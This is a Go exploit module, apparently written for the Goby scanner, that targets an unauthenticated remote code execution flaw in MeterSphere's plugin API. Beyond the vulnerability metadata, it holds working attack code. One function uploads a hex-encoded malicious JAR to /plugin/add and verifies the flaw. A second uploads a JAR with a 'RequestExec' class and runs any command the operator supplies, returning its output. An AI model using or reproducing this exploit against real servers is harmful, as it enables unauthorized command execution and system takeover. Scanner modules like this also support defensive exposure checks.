package exploits

import (
	"encoding/hex"
	"encoding/json"
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
	"strings"
)

func init() {
	expJson := `{
    "Name": "MeterSphere customMethod Api Remote Code Execution Vulnerability",
    "Description": "<p>Metersphere is a one-stop open-source continuous testing platform, covering functions such as test tracking, interface testing, performance testing and teamwork. It is compatible with JMeter and other open-source standards, effectively helps development and testing teams make full use of cloud elasticity to carry out highly scalable automated testing, accelerate high-quality software delivery, and promote the overall efficiency of China's testing industry &lt; p &gt; metersphere has a remote code execution vulnerability, which allows attackers to execute arbitrary code remotely without logging in. This vulnerability is caused by the lack of authentication of the plugin interface. Remote unauthorized attackers will cause remote code execution vulnerabilities by constructing specific requests&lt; br&gt;</p>",
    "Impact": "<p>MeterSphere Remote Code Execution</p>",
    "Recommendation": "<p>Users are advised to update metersphere version 1.16.4 and above in time: &lt; a href=\"<a href=\"https://metersphere.io/\">https://metersphere.io/</a> \" rel=\"nofollow\"&gt; <a href=\"https://metersphere.io/\">https://metersphere.io/</a> </p>",
    "Product": "MeterSphere",
    "VulType": [
        "Code Execution"
    ],
    "Tags": [
        "Code Execution"
    ],
    "Translation": {
        "CN": {
            "Name": "MeterSphere customMethod 接口远程代码执行漏洞",
            "Product": "MeterSphere",
            "Description": "<p>MeterSphere是一站式开源持续测试平台, 涵盖测试跟踪、接口测试、性能测试、 团队协作等功能，兼容JMeter等开源标准，有效助力开发和测试团队充分利用云弹性进行高度可扩展的自动化测试，加速高质量的软件交付，推动中国测试行业整体效率的提升。</p><p>MeterSphere 存在远程代码执行漏洞，攻击者无需登录，可直接远程执行任意代码。该漏洞由于plugin接口未做鉴权导致，远程未授权的攻击者通过构造特定的请求将导致远程代码执行漏洞危害。<br></p>",
            "Recommendation": "<p>建议用户及时更新至 MeterSphere 1.16.4 及以上版本：<a href=\"https://metersphere.io/\">https://metersphere.io/</a><br></p>",
            "Impact": "<p>MeterSphere 存在远程代码执行漏洞，攻击者无需登录，可直接远程执行任意代码。该漏洞由于plugin接口未做鉴权导致，远程未授权的攻击者通过构造特定的请求将导致远程代码执行漏洞危害。<br></p>",
            "VulType": [
                "代码执行"
            ],
            "Tags": [
                "代码执行"
            ]
        },
        "EN": {
            "Name": "MeterSphere customMethod Api Remote Code Execution Vulnerability",
            "Product": "MeterSphere",
            "Description": "<p>Metersphere is a one-stop open-source continuous testing platform, covering functions such as test tracking, interface testing, performance testing and teamwork. It is compatible with JMeter and other open-source standards, effectively helps development and testing teams make full use of cloud elasticity to carry out highly scalable automated testing, accelerate high-quality software delivery, and promote the overall efficiency of China's testing industry &lt; p &gt; metersphere has a remote code execution vulnerability, which allows attackers to execute arbitrary code remotely without logging in. This vulnerability is caused by the lack of authentication of the plugin interface. Remote unauthorized attackers will cause remote code execution vulnerabilities by constructing specific requests&lt; br&gt;</p>",
            "Recommendation": "<p>Users are advised to update metersphere version 1.16.4 and above in time: &lt; a href=\"<a href=\"https://metersphere.io/\">https://metersphere.io/</a> \" rel=\"nofollow\"&gt; <a href=\"https://metersphere.io/\">https://metersphere.io/</a> <br></p>",
            "Impact": "<p>MeterSphere Remote Code Execution</p>",
            "VulType": [
                "Code Execution"
            ],
            "Tags": [
                "Code Execution"
            ]
        }
    },
    "FofaQuery": "(title=\"MeterSphere\")",
    "GobyQuery": "(title=\"MeterSphere\")",
    "Author": "su18@javaweb.org",
    "Homepage": "https://metersphere.io/",
    "DisclosureDate": "2022-01-07",
    "References": [
        "https://mp.weixin.qq.com/s?__biz=MzI1NTMxMDU1MA==&mid=2247484978&idx=1&sn=b6ff573b89173a31c2f3ff89d7e678b5&chksm=ea36a98bdd41209d50d741d87d8f8eede8afdc70bbecb7876e7117b39fadf20bbb31b9d7e737#rd"
    ],
    "HasExp": true,
    "Is0day": false,
    "Level": "3",
    "CVSS": "7.3",
    "CVEIDs": [],
    "CNVD": [
        "CNVD-2022-01152"
    ],
    "CNNVD": [],
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/",
                "follow_redirect": false,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/",
                "follow_redirect": false,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExpParams": [
        {
            "name": "cmd",
            "type": "input",
            "value": "your command here",
            "show": ""
        }
    ],
    "ExpTips": {
        "type": "",
        "content": ""
    },
    "AttackSurfaces": {
        "Application": [],
        "Support": [],
        "Service": [],
        "System": [],
        "Hardware": []
    },
    "PocId": "10252"
}`

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(exp *jsonvul.JsonVul, u *httpclient.FixUrl, ss *scanconfig.SingleScanConfig) bool {
			loadJarCFG := httpclient.NewPostRequestConfig("/plugin/add")
			callMethodCFG := httpclient.NewPostRequestConfig("/plugin/customMethod")
			pocString := "/" + goutils.RandomHexString(16)
			pocHex := "504B0304140008080800DA682754000000000000000000000000090004004D4554412D494E462FFECA00000300504B0708000000000200000000000000504B0304140008080800DA682754000000000000000000000000140000004D4554412D494E462F4D414E49464553542E4D46F34DCCCB4C4B2D2ED10D4B2D2ACECCCFB35230D433E0E5722E4A4D2C494DD175AA040958E819C41B9A1B2A68F8172526E7A42A38E71715E417259600D56BF272F1720100504B070814616B2D4400000045000000504B0304140008080800D06827540000000000000000000000001300000052657175657374436F6D6D6F6E2E636C6173736D515B4B024114FEC6DBDABAA6BB9976B3322BAC24A1A7C0E84588044DC8287A1C75D29575D774B6DF554FDDA0E7E847456745B2B219F8CE9CEFDCBEC37C7CBEBC0138C0A68A19180AE654F89008633E822452612CA858C4928265052B0CA123D336E531833FB773C91028392DC110AB98B638737B0D31B8E00D8B18ADE90EA5D3AB0AD9715A0CDBB94A97DFF182C5ED76A12E07A6DD2EEEFCA06A8DAE68CA22835A77DC41539C985E13E35CDCBA62284B4EAFE7D8FB5EBA061511067D54EA4AD32A9CF261A7CAFB5E204D825A5C7205AB1AD6B04E6E93F429C868D8409621FAAB2143FCAF02AAC895BDC5A29301D49CD6EDBB143CCC4D6B9E66FE5D4C9F70655B8AB618302877DC7245ED862149532B5319456410A65FF18E0FCC5B9D50232F4D96910DEE3E823DD08314138646A44E388BD838B50C3F5D60EB15BEEB78FC11FE6ADE08EC3D23E8C755DE08E9787F823276EFBF5B1908102668E63C611259A428121F29D1BF00504B0708CD1DD5E16701000035020000504B01021400140008080800DA6827540000000002000000000000000900040000000000000000000000000000004D4554412D494E462FFECA0000504B01021400140008080800DA68275414616B2D440000004500000014000000000000000000000000003D0000004D4554412D494E462F4D414E49464553542E4D46504B01021400140008080800D0682754CD1DD5E167010000350200001300000000000000000000000000C300000052657175657374436F6D6D6F6E2E636C617373504B05060000000003000300BE0000006B0200000000"
			payloadBytes, _ := hex.DecodeString(pocHex)
			loadJarCFG.Header.Store("Content-Type", "multipart/form-data; boundary=----WebKitFormBoundarywcBc0bWsRJaRxrUG")
			loadJarCFG.Data = "------WebKitFormBoundarywcBc0bWsRJaRxrUG\r\nContent-Disposition: form-data; name=\"file\"; filename=\"whatever.jar\"\r\nContent-Type: application/octet-stream\r\n\r\n"
			loadJarCFG.Data += string(payloadBytes)
			loadJarCFG.Data += "\r\n------WebKitFormBoundarywcBc0bWsRJaRxrUG\r\nContent-Disposition: form-data; name=\"request\"; filename=\"blob\"\nContent-Type: application/json\r\n\r\nnull\r\n------WebKitFormBoundarywcBc0bWsRJaRxrUG--"
			loadJarCFG.Header.Store("Accept", "application/json, text/plain, */*")
			loadJarCFG.VerifyTls = false
			if _, err := httpclient.DoHttpRequest(u, loadJarCFG); err == nil {
				callMethodCFG.Header.Store("Accept", "application/json, text/plain, */*")
				callMethodCFG.Header.Store("Content-Type", "application/json")
				callMethodCFG.Data = "{\"entry\":\"RequestCommon\",\"request\":\"" + pocString + "\"}"
				callMethodCFG.VerifyTls = false
				if resp, err := httpclient.DoHttpRequest(u, callMethodCFG); err == nil {
					if resp.StatusCode == 200 && strings.Contains(resp.Utf8Html, pocString) {
						return true
					}
				}
			}
			return false
		},
		func(expResult *jsonvul.ExploitResult, ss *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			cmd := ss.Params["cmd"].(string)
			if cmd == "" {
				expResult.Output = ""
				expResult.Success = false
				return expResult
			}
			loadJarCFG := httpclient.NewPostRequestConfig("/plugin/add")
			callMethodCFG := httpclient.NewPostRequestConfig("/plugin/customMethod")
			expHex := "504B03041400080808005B672754000000000000000000000000090004004D4554412D494E462FFECA00000300504B0708000000000200000000000000504B03041400080808005B672754000000000000000000000000140000004D4554412D494E462F4D414E49464553542E4D46F34DCCCB4C4B2D2ED10D4B2D2ACECCCFB35230D433E0E5722E4A4D2C494DD175AA040958E819C41B9A1B2A68F8172526E7A42A38E71715E417259600D56BF272F1720100504B070814616B2D4400000045000000504B0304140008080800596727540000000000000000000000001100000052657175657374457865632E636C6173738D56E973136518FFBDB9DEED664BDB94B6A41C821C4DD323025A6B8A1C2DADD41E6053A80115B7C9B60924BB65B3E9A1221EF500454411056F671C66FC04339A821D8F4F1D47FF04FF01FDEE07C619ACCFBB69690AF198769E779FFB7EDFFCFCD7B7DF03D886CF6534A34BC2232568C23E8E6E192E3CCAD123A157429F8C7EEC97704086078F0930202122CE410907251CE2189251812E198F232AC0611947F004C7931C4F89CFA3129E96510355463586052526BEE2424B136044C2A838135E24714CC2711929A4658A4617D206C7988C3A9C90604AC808BAE54516E31C131C930C25A9A49E9D6C573309065FEF31755C0DA5547D3414B1CCA43EDAC6E0D991D493D64E0667A0FE1083ABC3886B0C65BD495DEBCFA6873573501D4E11458965339691EED3AC841167D812B8DB587D0169FFF0312D6691FDD288A5C68EF7A963B61D3BAC1E8E298E67EC2A3C4B25A21C28568EE718BCB19491D1C89EA6A619AA179C248D5087A00B0B6D224A396264CD98D6951491950F6827B25AC6EA9CD462CD425EC1566CA3D443C3493D344CA92B08E13E860ADB58D64AA642FB884A3109C99364E1CE54181C4D31066E649A75354D513FAFE0145E60808217F1928297314D159B48EA0A5EC1ABF4194B53511C2152AAB9D3587B36998A6B26C76B0A5EC7690567F006A5AFE04D9CA51C17336CCF8E8C68A6161FD0549266F02F32BAF5B1AC952F499EA7E02D9C63701F1CEC6A6A1529BC2DC07905EFE09C827731ADE002DE13E0223534AE5A5491F7314D5557F0012E112D464DE6B8ACE0437CA4A01D1D0A3E1625AB5C8ABD7332A68D59498332FC4424CBFB8DF5996C8CC688DB7515557D002D1C9F2AF84CE87A0BDAB0ACA4F951A049582A3F957EB11DB6C801D38869990C0570A4D88C16843598308D89FC44BA02DD62160A9B3795B1349A1BEFA86691C931CDB4A6FE7B54975681125053144555E0EE49AE3F4C762DA3D798D0CC0E3543FE57068A5A9162866EA9499DECAC2EB4D39150CD8828911ED36C6B05F90F64752B99269B32457E1BA95AE660814C1E5C9A5DE240A048B10A3516AA4A1A7C424D5A5D86696F7937C30A7253305634B48BAE96CF1BA906034519453C532F2A9784F3A36A5385B74ED334CC456F121D7171C350CDD5B1314DA7DD69FA5F5D5AD8258A6B4DA0E3DFD892652CAEB293A266682DD2D3225D2E76851534AA5BB7B451B19D7C5C4D65B5FD23E292EA2ED45A9010458FD33698C654BEAB7DD40975545BB45678A5D12ADBD71E36D0F5DD4CEF0EDD33E2C622E8A46FBACC086E27AC0E0E9BE70DCE80057D8E6FE0BC668BDF4F502626C0E97D2A210AAD665EC9D942CF9197842ECEC2152D2F9F81BB8FF5B3B08B85DD9EEFE0893A835FC31989BA7C3C12753744C21E9F741D2561EE93FD3C07EF6554F9F91CCA05A2F84A735871093579455F99502B5F509B45457406BE306957FA3D39ACEC6FCAA16A6816D5D159D4440959E5F3CFA07606ABC3AE02EA9ADB54370B97F85D39AC8D864BE6C888E42FC9615DB99CC33D4357E67FF3BBFF91D5E85BEF9772D87003F73A31D4E8DB58819FAE63531EF5BBAE63B3DF4DA0690EE7C9E3962B3813F68818033E879DD0B63C526F239B83BE205536D8904343982FD3E642DBCFAF0A7F4263C91FFBA3B8BF0D797FB561B98821F987C6AB70C3879BAC949A2BCE93D4A952D6629F3D2C619F27D92971527F459F733424E21D92514A7005CAE8CF47BF10020443A8440F56E228FD8648D0CF8A13588571F8E9A5A9C51758832FB11657B10E3F623D7EA171FB151BF13B36E1268DDD2D8498839E490FB652349B5919B6B07AD4B11002AC05CDAC8DF8BB89BF97F8FB88D683208BA281258897269E49BC71E29D247C9AF0D3849F25FC3CB6B30B14F98314F557F0CE538012472BC7431C618E368E1DF6FFC344012A6FA19363277DD7D6CED3E87BEE1605E3D8754B107671ECFE138E7F91DB334F15F116E1D9ABB20798A7AA16D315FB44EFE2C2E2F5D229B6AB2C3887D2E00D34325C81ABF71A915D7623EA169A534DED045A891A26FA0EE2B4518B76DAC97338FA2866B1AF7BED6E76FE0D504B07086CCAEF20CB050000670A0000504B010214001400080808005B6727540000000002000000000000000900040000000000000000000000000000004D4554412D494E462FFECA0000504B010214001400080808005B67275414616B2D440000004500000014000000000000000000000000003D0000004D4554412D494E462F4D414E49464553542E4D46504B01021400140008080800596727546CCAEF20CB050000670A00001100000000000000000000000000C300000052657175657374457865632E636C617373504B05060000000003000300BC000000CD0600000000"
			payloadBytes, _ := hex.DecodeString(expHex)
			loadJarCFG.Header.Store("Content-Type", "multipart/form-data; boundary=----WebKitFormBoundarywcBc0bWsRJaRxrUG")
			loadJarCFG.Data = "------WebKitFormBoundarywcBc0bWsRJaRxrUG\r\nContent-Disposition: form-data; name=\"file\"; filename=\"whatever.jar\"\r\nContent-Type: application/octet-stream\r\n\r\n"
			loadJarCFG.Data += string(payloadBytes)
			loadJarCFG.Data += "\r\n------WebKitFormBoundarywcBc0bWsRJaRxrUG\r\nContent-Disposition: form-data; name=\"request\"; filename=\"blob\"\nContent-Type: application/json\r\n\r\nnull\r\n------WebKitFormBoundarywcBc0bWsRJaRxrUG--"
			loadJarCFG.Header.Store("Accept", "application/json, text/plain, */*")
			loadJarCFG.VerifyTls = false
			if _, err := httpclient.DoHttpRequest(expResult.HostInfo, loadJarCFG); err == nil {
				callMethodCFG.Header.Store("Accept", "application/json, text/plain, */*")
				callMethodCFG.Header.Store("Content-Type", "application/json")
				callMethodCFG.Data = "{\"entry\":\"RequestExec\",\"request\":\"" + cmd + "\"}"
				callMethodCFG.VerifyTls = false
				if resp, err := httpclient.DoHttpRequest(expResult.HostInfo, callMethodCFG); err == nil {
					if strings.Contains(resp.Utf8Html, "\"code\":200") ||
						strings.Contains(resp.Utf8Html, "\"code\":500") {
						type Data13121 struct {
							Code141111 int    `json:"code"`
							Data515151 string `json:"data"`
						}
						type Result141414 struct {
							Success141111 bool      `json:"success"`
							Message111414 string    `json:"message"`
							Data141415111 Data13121 `json:"data"`
						}
						var r Result141414
						if err := json.Unmarshal([]byte(resp.Utf8Html), &r); err != nil {
							return expResult
						}
						expResult.Output = r.Data141415111.Data515151
						expResult.Success = true
					}
				}
			}
			return expResult
		},
	))
}
